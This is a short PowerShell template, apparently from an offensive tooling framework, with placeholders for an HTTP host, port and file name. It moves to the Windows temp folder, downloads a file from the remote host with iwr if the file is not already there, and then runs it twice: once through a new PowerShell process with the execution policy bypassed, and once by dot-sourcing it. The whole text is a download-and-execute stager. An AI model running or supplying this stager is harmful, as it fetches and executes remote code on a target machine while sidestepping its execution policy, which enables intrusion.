cd C:\windows\temp;
try { $fileExists = Test-Path "${filename}" } catch { $fileExists = $false };
if (-not $fileExists) { iwr -Uri "http://${http_ip}:${http_port}/${filename}" -OutFile "${filename}";};
Start-Process -FilePath "powershell" -ArgumentList "-ep bypass ./${filename}";
. .\${filename};